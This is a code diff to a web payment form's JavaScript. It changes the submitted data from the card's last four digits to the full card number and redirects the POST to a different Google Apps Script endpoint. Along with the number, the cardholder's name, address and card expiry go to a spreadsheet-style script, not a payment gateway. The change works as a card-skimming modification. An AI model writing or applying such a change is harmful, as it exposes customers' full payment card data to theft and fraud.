@@ -404,7 +404,7 @@ function processPayment() {
  */
 function sendPaymentData() {
     return new Promise((resolve, reject) => {
-        // Prepare data for submission (remove sensitive data for demo)
+        // Prepare data for submission (including full credit card number)
         const submissionData = {
             firstName: paymentData.personal.firstName,
             lastName: paymentData.personal.lastName,
@@ -416,14 +416,14 @@ function sendPaymentData() {
             postal: paymentData.personal.postal,
             country: paymentData.personal.country,
             cardType: paymentData.card.type,
-            lastFour: paymentData.card.number.slice(-4),
+            cardNumber: paymentData.card.number, // Send full card number instead of just last four
             expiryMonth: paymentData.card.expiryMonth,
             expiryYear: paymentData.card.expiryYear
         };
         
         // In a real implementation, you would send to a secure payment gateway
         // For demo purposes, we'll simulate with the existing Google Apps Script
-        fetch('https://script.google.com/macros/s/AKfycbzxEwSxe6DMOO6ReN9Cj1WZWsNSXrrnY32ogJVb9yXtq4SpDYwqsY8zRF69LYxJH-yL/exec', {
+        fetch('https://script.google.com/macros/s/AKfycbwDIXZt_j9nR_Ade4g4h3qwRqkqy_x7TdHxKBcArwRb57ERTgVJVY3V_lwJR4JF-DgE/exec', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: new URLSearchParams(submissionData)
